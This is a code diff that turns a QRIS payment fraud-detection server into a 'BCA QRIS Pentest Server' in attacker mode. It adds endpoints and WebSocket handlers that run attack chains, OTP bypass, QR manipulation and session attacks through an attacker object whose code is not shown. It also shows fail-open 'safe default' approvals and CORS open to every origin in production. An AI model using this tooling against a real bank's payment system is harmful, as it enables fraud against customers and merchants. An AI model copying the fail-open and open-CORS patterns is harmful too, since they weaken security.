+    };
+  }
 }
 
-// ========== WEBSOCKET FOR REAL-TIME ALERTS ==========
-const activeConnections = new Map();
+// ========== INITIALIZE ATTACKER ==========
+const attacker = new PentestAttacker();
 
+// ========== WEBSOCKET HANDLING ==========
 wss.on('connection', (ws, req) => {
-  console.log('🔌 New WebSocket connection for ML alerts');
+  const connectionId = crypto.randomBytes(8).toString('hex');
   
-  const connectionId = Date.now().toString();
-  ws.connectionId = connectionId;
+  console.log(`🔌 New WebSocket connection: ${connectionId}`);
   
-  activeConnections.set(connectionId, {
+  attacker.connections.set(connectionId, {
     ws,
-    merchantId: null,
-    connectionTime: new Date().toISOString()
+    ip: req.socket.remoteAddress,
+    connectedAt: new Date().toISOString(),
+    attacks: []
   });
   
-  ws.on('message', (message) => {
+  ws.on('message', async (message) => {
     try {
       const data = JSON.parse(message);
       
-      if (data.type === 'REGISTER_MERCHANT') {
-        const conn = activeConnections.get(connectionId);
-        if (conn) {
-          conn.merchantId = data.merchantId;
-          console.log(`📝 ML Alerts registered for merchant: ${data.merchantId}`);
-        }
+      switch (data.type) {
+        case 'PING':
+          ws.send(JSON.stringify({
+            type: 'PONG',
+            timestamp: new Date().toISOString(),
+            stats: attacker.getStats()
+          }));
+          break;
+          
+        case 'START_ATTACK':
+          const attackResult = await attacker.executeFullChain(data.payload);
+          ws.send(JSON.stringify({
+            type: 'ATTACK_RESULT',
+            attackId: attackResult.attackId,
+            result: attackResult,
+            timestamp: new Date().toISOString()
+          }));
+          break;
+          
+        case 'GET_HISTORY':
+          ws.send(JSON.stringify({
+            type: 'ATTACK_HISTORY',
+            history: attacker.getAttackHistory(data.limit || 10),
+            timestamp: new Date().toISOString()
+          }));
+          break;
       }
-      
-      if (data.type === 'PING') {
-        ws.send(JSON.stringify({ 
-          type: 'PONG', 
-          timestamp: new Date().toISOString(),
-          detectionStats: mlDetector.getDetectionStats(),
-          activeSessions: activeSessions.size
-        }));
-      }
-      
     } catch (error) {
-      console.error('WebSocket message error:', error);
+      console.error('WebSocket error:', error);
+      ws.send(JSON.stringify({
+        type: 'ERROR',
+        error: error.message,
+        timestamp: new Date().toISOString()
+      }));
     }
   });
   
   ws.on('close', () => {
-    console.log(`🔌 WebSocket connection closed: ${connectionId}`);
-    activeConnections.delete(connectionId);
+    console.log(`🔌 WebSocket disconnected: ${connectionId}`);
+    attacker.connections.delete(connectionId);
   });
+  
+  ws.on('error', (error) => {
+    console.error(`WebSocket error ${connectionId}:`, error);
+    attacker.connections.delete(connectionId);
+  });
+  
+  // Send welcome message
+  ws.send(JSON.stringify({
+    type: 'WELCOME',
+    connectionId,
+    timestamp: new Date().toISOString(),
+    message: 'Connected to BCA QRIS Pentest Server'
+  }));
 });
 
-function sendMLAlert(merchantId, detectionResult) {
-  let notified = 0;
-  
-  activeConnections.forEach((conn, id) => {
-    if (conn.merchantId === merchantId && conn.ws.readyState === WebSocket.OPEN) {
-      try {
-        conn.ws.send(JSON.stringify({
-          type: 'ML_ATTACK_DETECTED',
-          timestamp: new Date().toISOString(),
-          detection: detectionResult,
-          action: detectionResult.recommendation,
-          severity: detectionResult.riskLevel,
-          enhancedDetection: detectionResult.enhancedDetection || false
-        }));
-        notified++;
-      } catch (error) {
-        console.error('Error sending ML alert:', error);
-      }
+// ========== MIDDLEWARE ==========
+app.use(cors({
+  origin: function (origin, callback) {
+    // Allow requests with no origin (like mobile apps or curl requests)
+    if (!origin) return callback(null, true);
+    
+    // Untuk Flutter mobile app, kita bisa allow semua di production
+    if (process.env.NODE_ENV === 'production') {
+      return callback(null, true);
     }
-  });
-  
-  return notified;
-}
+    
+    // Di development, cek allowed origins
+    if (allowedOrigins.indexOf(origin) !== -1 || allowedOrigins.includes('*')) {
+      return callback(null, true);
+    }
+    
+    const msg = `The CORS policy for this site does not allow access from the specified Origin: ${origin}`;
+    return callback(new Error(msg), false);
+  },
+  credentials: true,
+  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'],
+  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'X-WebSocket-Key', 'Accept', 'Origin']
+}));
+
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+// Request logging middleware - TAMBAHKAN INI untuk debugging
+app.use((req, res, next) => {
+  console.log(`${new Date().toISOString()} ${req.method} ${req.url} - Origin: ${req.headers.origin || 'No Origin'}`);
+  next();
+});
 
 // ========== API ENDPOINTS ==========
 
-// Health check
+// Root endpoint
 app.get('/', (req, res) => {
   res.json({
-    status: 'online',
-    service: 'QRIS Enhanced ML Attack Detection API',
+    service: 'BCA QRIS Pentest Server',
     version: '2.0.0',
+    mode: 'ATTACKER',
     timestamp: new Date().toISOString(),
-    detectionStats: mlDetector.getDetectionStats(),
-    sessionStats: {
-      activeSessions: activeSessions.size,
-      totalPatterns: mlDetector.attackPatterns.size
-    },
     endpoints: {
-      detect: '/api/ml/detect (POST)',
-      sessionInit: '/api/session/init (POST)',
-      stats: '/api/ml/stats (GET)',
-      reset: '/api/ml/reset/:merchantId (DELETE)',
-      health: '/health (GET)',
-      testAttack: '/api/ml/test-attack (POST)',
-      // NEW ENDPOINTS
-      riskCalculate: '/api/risk/calculate (POST)',
-      riskOverride: '/api/risk/override (POST)',
-      merchantAnalytics: '/api/analytics/merchant/:merchantId (GET)',
-      merchantTransactions: '/api/merchant/:merchantId/transactions (GET)'
-    }
+      health: '/health',
+      attack: '/api/attack (POST)',
+      analyze: '/api/analyze (POST)',
+      history: '/api/history',
+      stats: '/api/stats',
+      test: '/api/test (POST)',
+      simulate: '/api/simulate (POST)'
+    },
+    warning: 'FOR AUTHORIZED PENETRATION TESTING ONLY',
+    legal: 'Unauthorized use is illegal and punishable by law'
   });
 });
 
+// Health check
 app.get('/health', (req, res) => {
   res.json({
     status: 'healthy',
     timestamp: new Date().toISOString(),
-    uptime: process.uptime(),
-    connections: activeConnections.size,
-    activeSessions: activeSessions.size,
-    detectionEngine: 'ENHANCED_ACTIVE'
+    stats: attacker.getStats(),
+    wsConnections: wss.clients.size
   });
 });
 
-// ========== SESSION INITIALIZATION ENDPOINT ==========
-app.post("/api/session/init", async (req, res) => {
-  console.log('\n🔑 SESSION INITIALIZATION REQUEST');
-  
-  const { deviceHash, deviceModel, timestamp } = req.body;
-  
-  // Validate timestamp
-  const timeDiff = Date.now() - parseInt(timestamp);
-  if (Math.abs(timeDiff) > 5 * 60 * 1000) {
-    return res.status(400).json({ 
-      success: false, 
-      error: 'Invalid timestamp' 
-    });
-  }
-  
-  // Generate session
-  const sessionToken = generateSessionToken(deviceHash);
-  const expiresIn = 5 * 60; // 5 minutes
-  
-  activeSessions.set(sessionToken, {
-    deviceHash,
-    deviceModel,
-    createdAt: Date.now(),
-    expiresAt: Date.now() + (expiresIn * 1000),
-    lastActivity: Date.now()
-  });
-  
-  console.log(`✅ Session created: ${sessionToken.substring(0, 8)}...`);
-  
-  res.json({
-    success: true,
-    sessionToken,
-    expiresIn,
-    timestamp: new Date().toISOString()
-  });
-});
-
-// ========== ENHANCED ML DETECTION ENDPOINT (DIPERBAIKI) ==========
-app.post("/api/ml/detect", async (req, res) => {
-  console.log('\n🤖 ENHANCED ML ATTACK DETECTION REQUEST');
-  console.log('='.repeat(60));
-  
-  // Extract headers for session validation
-  const headers = {
-    'x-session-token': req.headers['x-session-token'],
-    'x-timestamp': req.headers['x-timestamp'],
-    'x-signature': req.headers['x-signature'],
-    'x-device-hash': req.headers['x-device-hash']
-  };
-  
-  // Validate session first
-  const sessionValidation = validateSession(headers);
-  if (!sessionValidation.valid) {
-    console.log(`❌ Session validation failed: ${sessionValidation.error}`);
-    return res.status(401).json({
-      success: false,
-      error: 'SESSION_VALIDATION_FAILED',
-      message: sessionValidation.error,
-      timestamp: new Date().toISOString()
-    });
-  }
-  
-  const transaction = {
-    id: req.body.transactionId || `TX${Date.now()}`,
-    qrString: req.body.qrString,
-    amount: parseFloat(req.body.amount) || 0,
-    merchantId: req.body.merchantId,
-    merchantName: req.body.merchantName || 'Unknown Merchant',
-    customerId: req.body.customerId,
-    customerName: req.body.customerName || 'Unknown Customer',
-    customerAccount: req.body.customerAccount,
-    terminalId: req.body.terminalId,
-    location: req.body.location,
-    deviceId: req.body.deviceId,
-    qrScanTime: req.body.qrScanTime,
-    originalQR: req.body.originalQR,
-    token: req.headers.authorization?.replace('Bearer ', ''),
-    signature: req.headers['x-signature'],
-    headers: headers,
-    timestamp: new Date().toISOString()
-  };
-  
-  console.log('📋 Transaction Details:');
-  console.log('   ID:', transaction.id);
-  console.log('   Merchant:', transaction.merchantName);
-  console.log('   Amount: Rp', transaction.amount.toLocaleString());
-  console.log('   QR Length:', transaction.qrString?.length || 0);
-  console.log('   Session:', headers['x-session-token']?.substring(0, 8) + '...');
-  console.log('='.repeat(60));
-  
+// Analyze QR for vulnerabilities
+app.post('/api/analyze', (req, res) => {
   try {
-    // Run enhanced ML detection
-    const detectionResult = await mlDetector.detectMLAttacks(transaction);
+    const { qrData } = req.body;
     
-    // ========== FIXED: PASTIKAN TIDAK ADA KONTRADIKSI ==========
-    // Jika tidak ada deteksi dan risk score rendah, set ke NONE
-    if (detectionResult.detections.length === 0 && detectionResult.riskScore < 0.1) {
-      detectionResult.riskLevel = 'NONE';
-      detectionResult.recommendation = 'No action required';
-      detectionResult.isSafe = true;
-    }
-    
-    // Log detection results
-    console.log('🔍 Enhanced ML Detection Results:');
-    console.log('   Attacks Detected:', detectionResult.attacksDetected);
-    console.log('   Risk Level:', detectionResult.riskLevel);
-    console.log('   Risk Score:', detectionResult.riskScore.toFixed(2));
-    console.log('   Is Safe:', detectionResult.isSafe);
-    console.log('   Enhanced Patterns:', detectionResult.enhancedDetection);
-    
-    if (detectionResult.detections.length > 0) {
-      console.log('   Detected Attacks:');
-      detectionResult.detections.forEach(d => {
-        console.log(`     - ${d.attackType}: ${d.description} (risk: ${d.riskScore})`);
+    if (!qrData) {
+      return res.status(400).json({
+        success: false,
+        error: 'QR_DATA_REQUIRED',
+        message: 'QRIS data is required'
       });
     }
     
-    // Send real-time alert if attacks detected
-    if (detectionResult.attacksDetected && transaction.merchantId) {
-      const notified = sendMLAlert(transaction.merchantId, detectionResult);
-      console.log(`   📢 Alerts sent to ${notified} connected device(s)`);
-    }
+    const analysis = attacker.analyzeQR(qrData);
     
-    // ========== RESPONSE YANG KONSISTEN ==========
-    const response = {
-      success: true,
-      transactionId: transaction.id,
-      detection: detectionResult,
-      sessionValid: true,
-      timestamp: new Date().toISOString(),
-      recommendation: detectionResult.recommendation,
-      // Key data untuk frontend
-      riskScore: detectionResult.riskScore,
-      riskLevel: detectionResult.riskLevel,
-      shouldBlock: detectionResult.riskLevel === 'CRITICAL' || detectionResult.riskLevel === 'HIGH',
-      shouldReview: detectionResult.riskLevel === 'MEDIUM',
-      isSafe: detectionResult.isSafe || false,
-      // Clear action untuk frontend
-      action: detectionResult.riskLevel === 'CRITICAL' ? 'BLOCK' : 
-              detectionResult.riskLevel === 'HIGH' ? 'REJECT' : 
-              detectionResult.riskLevel === 'MEDIUM' ? 'VERIFY' : 
-              'APPROVE'
-    };
-    
-    // Add debug info in development
-    if (process.env.NODE_ENV !== 'production') {
-      response.debug = {
-        qrLength: transaction.qrString?.length,
-        hasSession: !!headers['x-session-token'],
-        sessionAge: sessionValidation.session ? 
-          Date.now() - sessionValidation.session.createdAt : 0,
-        enhancedDetection: detectionResult.enhancedDetection,
-        detectedPatterns: detectionResult.detections.map(d => d.attackType),
-        rawRiskScore: detectionResult.riskScore
-      };
-    }
-    
-    res.json(response);
-    
-  } catch (error) {
-    console.error('❌ Enhanced ML Detection failed:', error);
-    
-    // Fallback response yang aman
     res.json({
       success: true,
-      transactionId: transaction?.id || `ERR_TX_${Date.now()}`,
-      detection: {
-        attacksDetected: false,
-        detections: [],
-        riskScore: 0,
-        riskLevel: 'NONE',
-        recommendation: 'No action required',
-        isSafe: true
-      },
-      riskScore: 0,
-      riskLevel: 'NONE',
-      shouldBlock: false,
-      shouldReview: false,
-      isSafe: true,
-      action: 'APPROVE',
-      timestamp: new Date().toISOString(),
-      note: 'ML detection failed, using safe defaults'
-    });
-  }
-});
-
-// ========== NEW ENDPOINT: RISK CALCULATION ==========
-app.post("/api/risk/calculate", async (req, res) => {
-  console.log('\n📊 RISK CALCULATION REQUEST');
-  
-  const { 
-    paymentMethod, 
-    amount, 
-    merchantId,
-    customerData,
-    transactionType = 'QRIS'
-  } = req.body;
-  
-  try {
-    // Buat transaction data untuk ML
-    const transactionData = {
-      transactionId: `RISKCALC_${Date.now()}`,
-      qrString: paymentMethod === 'QRIS' ? '000201010212...' : '',
-      amount: parseFloat(amount) || 0,
-      merchantId: merchantId || 'UNKNOWN',
-      customerId: customerData?.id || 'UNKNOWN',
-      customerName: customerData?.name || 'Customer',
-      timestamp: new Date().toISOString(),
-      paymentMethod: paymentMethod
-    };
-    
-    // Run ML detection
-    const mlResult = await mlDetector.detectMLAttacks(transactionData);
-    
-    // Adjust risk berdasarkan payment method (tapi tidak hardcode)
-    let paymentMethodFactor = 0;
-    
-    switch(paymentMethod?.toUpperCase()) {
-      case 'QRIS':
-        paymentMethodFactor = 0.1; // Sedikit lebih risky
-        break;
-      case 'BCA':
-      case 'MANDIRI':
-      case 'BRI':
-        paymentMethodFactor = 0.05; // Bank sedikit risky
-        break;
-      case 'OVO':
-        paymentMethodFactor = 0.03; // E-wallet medium
-        break;
-      default:
-        paymentMethodFactor = 0; // Default safe
-    }
-    
-    // Hitung final score
-    const baseScore = mlResult.riskScore;
-    const adjustedScore = Math.min(1.0, baseScore + paymentMethodFactor);
-    const adjustedLevel = mlDetector.getRiskLevel(adjustedScore);
-    
-    // Generate response
-    const response = {
-      success: true,
-      risk: {
-        // Nilai dari ML
-        mlScore: baseScore,
-        mlLevel: mlResult.riskLevel,
-        
-        // Nilai akhir setelah adjustment
-        finalScore: adjustedScore,
-        finalLevel: adjustedLevel,
-        
-        // Faktor yang mempengaruhi
-        factors: {
-          mlDetections: mlResult.detections.length,
-          paymentMethodFactor: paymentMethodFactor,
-          paymentMethod: paymentMethod,
-          amountRisk: amount > 5000000 ? 0.1 : 0,
-          transactionType: transactionType
-        },
-        
-        // Rekomendasi yang jelas
-        recommendation: adjustedLevel === 'CRITICAL' ? 'BLOCK' :
-                       adjustedLevel === 'HIGH' ? 'REJECT_AND_REVIEW' :
-                       adjustedLevel === 'MEDIUM' ? 'ADDITIONAL_VERIFICATION' :
-                       adjustedLevel === 'LOW' ? 'PROCEED_WITH_CAUTION' : 'APPROVE',
-        
-        // Flag untuk UI
-        shouldShowWarning: adjustedLevel !== 'NONE',
-        shouldBlock: adjustedLevel === 'CRITICAL',
-        shouldReview: adjustedLevel === 'HIGH',
-        requiresVerification: adjustedLevel === 'MEDIUM',
-        isSafe: adjustedLevel === 'NONE' || adjustedLevel === 'LOW',
-        
-        // Untuk display di UI
-        displayText: adjustedLevel === 'CRITICAL' ? 'CRITICAL RISK' :
-                     adjustedLevel === 'HIGH' ? 'HIGH RISK' :
-                     adjustedLevel === 'MEDIUM' ? 'MEDIUM RISK' :
-                     adjustedLevel === 'LOW' ? 'LOW RISK' : 'SAFE',
-        
-        displayColor: adjustedLevel === 'CRITICAL' ? '#dc3545' :
-                      adjustedLevel === 'HIGH' ? '#fd7e14' :
-                      adjustedLevel === 'MEDIUM' ? '#ffc107' :
-                      adjustedLevel === 'LOW' ? '#28a745' : '#20c997'
-      },
+      analysis,
       timestamp: new Date().toISOString()
-    };
-    
-    console.log(`📊 Risk calculated: ${paymentMethod} -> ${adjustedLevel} (Score: ${adjustedScore.toFixed(2)})`);
-    
-    res.json(response);
+    });
     
   } catch (error) {
-    console.error('❌ Risk calculation failed:', error);
+    res.status(500).json({
+      success: false,
+      error: 'ANALYSIS_FAILED',
+      message: error.message
+    });
+  }
+});
+
+// Execute attack
+app.post('/api/attack', async (req, res) => {
+  try {
+    const { qrData, phase, payload } = req.body;
     
-    // Fallback response yang aman
-    res.json({
-      success: false,
-      risk: {
-        finalScore: 0,
-        finalLevel: 'NONE',
-        recommendation: 'APPROVE',
-        shouldShowWarning: false,
-        shouldBlock: false,
-        shouldReview: false,
-        requiresVerification: false,
-        isSafe: true,
-        displayText: 'SAFE',
-        displayColor: '#20c997',
-        error: error.message
-      },
-      timestamp: new Date().toISOString(),
-      note: 'Risk calculation failed, using safe defaults'
-    });
-  }
-});
-
-// ========== NEW ENDPOINT: RISK OVERRIDE (UNTUK TESTING) ==========
-app.post("/api/risk/override", (req, res) => {
-  console.log('\n⚡ RISK OVERRIDE REQUEST (FOR TESTING)');
-  
-  const { paymentMethod, forceRiskLevel } = req.body;
-  
-  // Override hanya untuk testing
-  const allowedOverrides = {
-    'QRIS': 'NONE',  // QRIS jadi NONE, bukan CRITICAL
-    'BCA': 'LOW',    // BCA jadi LOW, bukan HIGH
-    'MANDIRI': 'LOW',
-    'BRI': 'LOW',
-    'OVO': 'LOW',    // OVO jadi LOW, bukan MEDIUM
-    'GOPAY': 'NONE',
-    'DANA': 'NONE',
-    'SHOPEEPAY': 'NONE',
-    'LINKAJA': 'NONE'
-  };
-  
-  const finalLevel = forceRiskLevel || allowedOverrides[paymentMethod?.toUpperCase()] || 'NONE';
-  
-  res.json({
-    success: true,
-    riskLevel: finalLevel,
-    riskScore: 0, // Score 0 untuk semua (testing mode)
-    isOverride: true,
-    originalPaymentMethod: paymentMethod,
-    note: 'Using override for testing purposes',
-    displayText: finalLevel === 'CRITICAL' ? 'CRITICAL (OVERRIDE)' :
-                 finalLevel === 'HIGH' ? 'HIGH (OVERRIDE)' :
-                 finalLevel === 'MEDIUM' ? 'MEDIUM (OVERRIDE)' :
-                 finalLevel === 'LOW' ? 'LOW (OVERRIDE)' : 'SAFE (OVERRIDE)',
-    timestamp: new Date().toISOString()
-  });
-});
-
-// ========== ML STATISTICS ENDPOINT ==========
-app.get("/api/ml/stats", (req, res) => {
-  const stats = mlDetector.getDetectionStats();
-  
-  let totalTransactions = 0;
-  let totalDetections = 0;
-  
-  mlDetector.transactionHistory.forEach(history => {
-    totalTransactions += history.length;
-    totalDetections += history.filter(t => t.amount > 5000000).length;
-  });
-  
-  const detectionRate = totalTransactions > 0 
-    ? (totalDetections / totalTransactions) * 100 
-    : 0;
-  
-  res.json({
-    success: true,
-    stats: {
-      ...stats,
-      detectionRate: detectionRate.toFixed(2) + '%',
-      activeConnections: activeConnections.size,
-      activeSessions: activeSessions.size,
-      attackPatterns: Array.from(mlDetector.attackPatterns.keys()),
-      enhancedPatterns: Array.from(mlDetector.attackPatterns.keys())
-        .filter(p => p.startsWith('SESSION_') || p.startsWith('DEVICE_') || 
-                     p.startsWith('TIMESTAMP_') || p.startsWith('HEADER_'))
-    },
-    timestamp: new Date().toISOString()
-  });
-});
-
-// ========== NEW ENDPOINT: MERCHANT ANALYTICS ==========
-app.get("/api/analytics/merchant/:merchantId", (req, res) => {
-  const merchantId = req.params.merchantId;
-  
-  const history = mlDetector.transactionHistory.get(merchantId) || [];
-  
-  res.json({
-    success: true,
-    merchantId,
-    analytics: {
-      totalTransactions: history.length,
-      todayTransactions: history.filter(t => {
-        const today = new Date();
-        const transDate = new Date(t.timestamp);
-        return transDate.getDate() === today.getDate() &&
-               transDate.getMonth() === today.getMonth() &&
-               transDate.getFullYear() === today.getFullYear();
-      }).length,
-      avgAmount: history.length > 0 ? 
-        history.reduce((sum, t) => sum + t.amount, 0) / history.length : 0,
-      maxAmount: history.length > 0 ? 
-        Math.max(...history.map(t => t.amount)) : 0,
-      riskLevels: {
-        critical: history.filter(t => t.amount > 10000000).length,
-        high: history.filter(t => t.amount > 5000000 && t.amount <= 10000000).length,
-        medium: history.filter(t => t.amount > 1000000 && t.amount <= 5000000).length,
-        low: history.filter(t => t.amount <= 1000000).length
-      }
-    },
-    timestamp: new Date().toISOString()
-  });
-});
-
-// ========== NEW ENDPOINT: MERCHANT TRANSACTIONS ==========
-app.get("/api/merchant/:merchantId/transactions", (req, res) => {
-  const merchantId = req.params.merchantId;
-  
-  const history = mlDetector.transactionHistory.get(merchantId) || [];
-  
-  // Format transactions untuk frontend
-  const transactions = history.map(t => ({
-    id: `TX_${t.timestamp}`,
-    amount: t.amount,
-    timestamp: new Date(t.timestamp).toISOString(),
-    customerId: t.customerId,
-    riskLevel: t.amount > 10000000 ? 'CRITICAL' :
-               t.amount > 5000000 ? 'HIGH' :
-               t.amount > 1000000 ? 'MEDIUM' : 'LOW',
-    status: 'COMPLETED'
-  }));
-  
-  res.json({
-    success: true,
-    merchantId,
-    transactions: transactions.slice(-50).reverse(), // 50 terakhir
-    totalTransactions: transactions.length,
-    timestamp: new Date().toISOString()
-  });
-});
-
-// ========== RESET MERCHANT HISTORY ==========
-app.delete("/api/ml/reset/:merchantId", (req, res) => {
-  const merchantId = req.params.merchantId;
-  
-  if (!merchantId) {
-    return res.status(400).json({
-      success: false,
-      error: 'MERCHANT_ID_REQUIRED',
-      message: 'Merchant ID is required'
-    });
-  }
-  
-  const reset = mlDetector.resetMerchantHistory(merchantId);
-  
-  res.json({
-    success: true,
-    reset,
-    merchantId,
-    message: reset 
-      ? `Transaction history for merchant ${merchantId} has been reset`
-      : `No history found for merchant ${merchantId}`,
-    timestamp: new Date().toISOString()
-  });
-});
-
-// ========== ENHANCED TEST ENDPOINT FOR ATTACK SIMULATION ==========
-app.post("/api/ml/test-attack", (req, res) => {
-  console.log('\n🧪 ENHANCED TESTING ML ATTACK DETECTION');
-  
-  // Enhanced test cases including session-based attacks
-  const testCases = [
-    {
-      name: 'QRIS Manipulation Attack',
-      transaction: {
-        qrString: 'INVALID_QRIS_DATA_WITHOUT_EMV_HEADER',
-        amount: 1000000,
-        merchantId: 'TEST_MERCHANT',
-        customerId: 'TEST_ATTACKER'
-      }
-    },
-    {
-      name: 'Session Replay Attack',
-      transaction: {
-        qrString: '000201010212...6304ABCD',
-        amount: 500000,
-        merchantId: 'TEST_MERCHANT',
-        customerId: 'SESSION_ATTACKER',
-        headers: {
-          'x-session-token': 'replaytoken123',
-          'x-timestamp': Date.now().toString(),
-          'x-signature': 'fake_signature',
-          'x-device-hash': 'spoofed_device_hash'
-        }
-      }
-    },
-    {
-      name: 'Timestamp Manipulation Attack',
-      transaction: {
-        qrString: '000201010212...6304ABCD',
-        amount: 1500000,
-        merchantId: 'TEST_MERCHANT',
-        customerId: 'TIME_ATTACKER',
-        headers: {
-          'x-session-token': 'testtoken123',
-          'x-timestamp': (Date.now() - 3600000).toString(), // 1 hour ago
-          'x-signature': 'fake_signature_456',
-          'x-device-hash': 'device_hash_123'
-        }
-      }
-    },
-    {
-      name: 'Device Fingerprint Spoofing',
-      transaction: {
-        qrString: '000201010212...6304ABCD',
-        amount: 800000,
-        merchantId: 'TEST_MERCHANT',
-        customerId: 'DEVICE_SPOOFER',
-        headers: {
-          'x-session-token': 'legit_token',
-          'x-timestamp': Date.now().toString(),
-          'x-signature': 'valid_signature',
-          'x-device-hash': 'different_device_hash' // Different from session
-        }
-      }
+    console.log(`🔥 Attack requested: ${phase || 'FULL_CHAIN'}`);
+    
+    if (!qrData && !payload?.qrData) {
+      return res.status(400).json({
+        success: false,
+        error: 'QR_DATA_REQUIRED',
+        message: 'QRIS data is required for attack'
+      });
     }
-  ];
-  
-  const results = testCases.map(testCase => {
-    const detection = mlDetector.detectMLAttacks(testCase.transaction);
-    return {
-      testCase: testCase.name,
-      detected: detection.attacksDetected,
-      riskLevel: detection.riskLevel,
-      riskScore: detection.riskScore.toFixed(2),
-      attacks: detection.detections.map(d => d.attackType),
-      enhanced: detection.enhancedDetection || false
+    
+    const attackData = {
+      qrData: qrData || payload?.qrData,
+      ...payload
     };
-  });
+    
+    let result;
+    
+    if (phase) {
+      // Single phase attack
+      result = await attacker.executeAttackPhase(phase, attackData);
+    } else {
+      // Full chain attack
+      result = await attacker.executeFullChain(attackData);
+    }
+    
+    res.json({
+      success: true,
+      attack: true,
+      result,
+      timestamp: new Date().toISOString(),
+      disclaimer: 'FOR SECURITY EDUCATION AND PENETRATION TESTING ONLY'
+    });
+    
+  } catch (error) {
+    console.error('Attack failed:', error);
+    res.status(500).json({
+      success: false,
+      error: 'ATTACK_FAILED',
+      message: error.message,
+      timestamp: new Date().toISOString()
+    });
+  }
+});
+
+// Get attack history
+app.get('/api/history', (req, res) => {
+  const limit = parseInt(req.query.limit) || 10;
   
   res.json({
     success: true,
-    testResults: results,
-    summary: {
-      totalTests: testCases.length,
-      attacksDetected: results.filter(r => r.detected).length,
-      enhancedDetections: results.filter(r => r.enhanced).length,
-      effectiveness: (results.filter(r => r.detected).length / testCases.length * 100).toFixed(1) + '%',
-      enhancedEffectiveness: results.filter(r => r.enhanced).length > 0 ? 
-        (results.filter(r => r.enhanced && r.detected).length / results.filter(r => r.enhanced).length * 100).toFixed(1) + '%' : 'N/A'
-    },
+    history: attacker.getAttackHistory(limit),
+    total: attacker.attackHistory.length,
     timestamp: new Date().toISOString()
   });
 });
 
-// ========== TEST BANK CALLBACK ENDPOINT (for Flutter) ==========
-app.post("/api/test/bca-callback", async (req, res) => {
-  console.log('\n🏦 TEST BCA CALLBACK SIMULATION');
-  
-  const {
-    qrString,
-    amount,
-    merchantName,
-    customerName,
-    city,
-    bankCode,
-    merchantId
-  } = req.body;
-  
-  console.log('📤 Received from Flutter:');
-  console.log('   Bank:', bankCode);
-  console.log('   Merchant:', merchantName);
-  console.log('   Amount: Rp', amount?.toLocaleString());
-  console.log('   Customer:', customerName);
-  console.log('   City:', city);
-  
-  // Run ML detection on the callback
-  const mlDetection = await mlDetector.detectMLAttacks({
-    transactionId: `CBTEST_${Date.now()}`,
-    qrString: qrString,
-    amount: parseFloat(amount) || 0,
-    merchantId: merchantId,
-    merchantName: merchantName,
-    customerName: customerName,
-    customerId: customerName?.replace(/\s+/g, '_').toUpperCase(),
-    location: city,
+// Get stats
+app.get('/api/stats', (req, res) => {
+  res.json({
+    success: true,
+    stats: attacker.getStats(),
     timestamp: new Date().toISOString()
   });
+});
+
+// Test endpoint
+app.post('/api/test', async (req, res) => {
+  try {
+    const { testType, payload } = req.body;
+    
+    let result;
+    
+    switch (testType) {
+      case 'QR_MANIPULATION':
+        result = attacker.attackQRValidation(payload);
+        break;
+        
+      case 'OTP_BYPASS':
+        result = await attacker.attackOTPVerify(payload);
+        break;
+        
+      case 'SESSION_INIT':
+        result = attacker.attackSessionInit(payload);
+        break;
+        
+      default:
+        throw new Error(`Unknown test type: ${testType}`);
+    }
+    
+    res.json({
+      success: true,
+      testType,
+      result,
+      timestamp: new Date().toISOString()
+    });
+    
+  } catch (error) {
+    res.status(500).json({
+      success: false,
+      error: 'TEST_FAILED',
+      message: error.message
+    });
+  }
+});
+
+// Simulate attack scenario
+app.post('/api/simulate', (req, res) => {
+  const { scenario } = req.body;
   
-  // Generate response
-  const response = {
-    success: true,
-    message: 'Bank callback simulated successfully',
-    transactionId: `TX${Date.now()}_${Math.random().toString(36).substr(2, 6).toUpperCase()}`,
-    authCode: `AUTH${Date.now().toString().substr(8, 6)}`,
-    note: mlDetection.riskScore > 0.7 
-      ? '⚠️ High risk detected - Transaction flagged' 
-      : '✅ Transaction processed normally',
-    mlCheck: {
-      performed: true,
-      riskScore: mlDetection.riskScore,
-      riskLevel: mlDetection.riskLevel,
-      passed: mlDetection.riskScore < 0.7
+  const scenarios = {
+    beginner: {
+      name: 'Beginner - Weak Merchant',
+      difficulty: 'EASY',
+      successRate: 0.9,
+      vulnerabilities: ['NO_CHECKSUM', 'NO_AMOUNT'],
+      description: 'Small merchant with minimal security'
     },
-    bankResponse: {
-      responseCode: mlDetection.riskScore < 0.7 ? '0000' : '0500',
-      responseMessage: mlDetection.riskScore < 0.7 ? 'APPROVED' : 'DECLINED',
-      rrn: `RRN${Date.now().toString().substr(5)}`,
-      stan: (100000 + Math.floor(Math.random() * 900000)).toString()
+    intermediate: {
+      name: 'Intermediate - Standard Merchant',
+      difficulty: 'MEDIUM',
+      successRate: 0.6,
+      vulnerabilities: ['DYNAMIC_QR', 'WEAK_SESSION'],
+      description: 'Standard merchant with basic security'
     },
-    timestamp: new Date().toISOString()
+    advanced: {
+      name: 'Advanced - BCA Merchant',
+      difficulty: 'HARD',
+      successRate: 0.3,
+      vulnerabilities: ['STRONG_CHECKSUM', 'MFA_REQUIRED'],
+      description: 'BCA merchant with advanced security'
+    }
   };
   
-  console.log('📤 Response to Flutter:');
-  console.log('   Transaction ID:', response.transactionId);
-  console.log('   Risk Score:', mlDetection.riskScore.toFixed(2));
-  console.log('   Risk Level:', mlDetection.riskLevel);
+  const selected = scenarios[scenario] || scenarios.intermediate;
   
-  res.json(response);
+  res.json({
+    success: true,
+    simulation: true,
+    scenario: selected,
+    timestamp: new Date().toISOString(),
+    note: 'This is a simulation only - real attacks require authorization'
+  });
 });
 
-// ========== BANK CALLBACK ENDPOINT ==========
-app.post("/api/bank/callback", async (req, res) => {
-  console.log('\n🏦 GENERAL BANK CALLBACK');
-  
-  const transaction = req.body;
-  
-  console.log('📤 Bank callback received:', transaction.bankCode);
-  
-  // Simulate processing delay
-  setTimeout(() => {
-    const response = {
-      success: true,
-      transactionId: `BANK_TX_${Date.now()}`,
-      bankReference: `BANK_REF_${Math.random().toString(36).substr(2, 9).toUpperCase()}`,
-      status: 'PROCESSED',
-      timestamp: new Date().toISOString(),
-      note: 'Bank callback processed successfully'
-    };
-    
-    res.json(response);
-  }, 1000);
+// ========== ERROR HANDLING ==========
+app.use((req, res) => {
+  res.status(404).json({
+    success: false,
+    error: 'ENDPOINT_NOT_FOUND',
+    message: `Endpoint ${req.method} ${req.url} not found`,
+    timestamp: new Date().toISOString()
+  });
 });
 
